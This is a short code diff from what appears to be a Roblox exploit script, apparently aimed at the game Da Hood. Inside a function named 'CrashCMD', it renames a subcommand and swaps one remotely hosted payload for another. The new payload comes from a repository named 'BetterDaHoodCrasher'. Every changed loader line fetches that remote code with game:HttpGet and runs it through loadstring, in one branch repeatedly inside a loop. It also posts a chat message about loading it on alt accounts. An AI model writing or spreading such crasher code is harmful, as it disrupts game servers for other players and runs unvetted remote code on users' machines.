@@ -2284,7 +2284,7 @@ getgenv().CrashCMD = function(args)
 
                 end
 
-            elseif args[2]:lower() == 'encrypt' then
+            elseif args[2]:lower() == 'Lowk' then
 
                 if args[3] then
 
@@ -2294,7 +2294,7 @@ getgenv().CrashCMD = function(args)
 
                         for k = 1, thefinal do
 
-                            loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/encryptgui.lua"))()
+                            loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
 
                         end
 
@@ -2316,9 +2316,9 @@ getgenv().CrashCMD = function(args)
 
                 else
 
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/encryptgui.lua"))()
+                    loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
 
-                    getgenv().MUF_sendChatMessage('Loaded Encrypt On Alt1 & Controller!')
+                    getgenv().MUF_sendChatMessage('Loaded LowK On Alt1 & Controller!')
 
                 end
 
